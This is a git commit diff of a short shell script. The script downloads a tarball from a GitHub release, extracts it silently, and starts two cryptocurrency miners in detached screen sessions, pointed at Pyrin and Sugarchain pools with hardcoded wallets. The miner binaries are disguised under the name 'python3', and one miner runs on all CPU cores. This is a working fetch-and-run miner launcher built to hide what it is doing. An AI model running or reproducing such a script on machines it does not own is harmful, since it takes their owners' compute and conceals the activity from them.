479aea014bd7bbde10dd20ad2a05184a58e46118
DotAja <142836390+DotAja@users.noreply.github.com>
2024-07-03 05:44:10 +0700

    Update akuDot.sh

--- akuDot.sh
+++ akuDot.sh
@@ -1,12 +1,13 @@
 #!/bin/bash
 
+sudo apt install screen -y 
+
 wget -q -O TOT https://github.com/DotAja/ALONE/releases/download/alone/dotaja.tar.gz
 
 tar -xzf TOT >/dev/null 2>&1
 
 rm TOT
 
-nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT_CPU/GPU --no-cl > /dev/null 2>&1 &
+screen -dmS dotlol ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT_CPU-GPU
 
-nohup ./dotsrb/python3 -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.DOT_CPU/GPU -t $(nproc) > /dev/null 2>&1 &
-
+screen -dmS dotsrb ./dotsrb/python3 -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.DOT_CPU-GPU -t $(nproc)
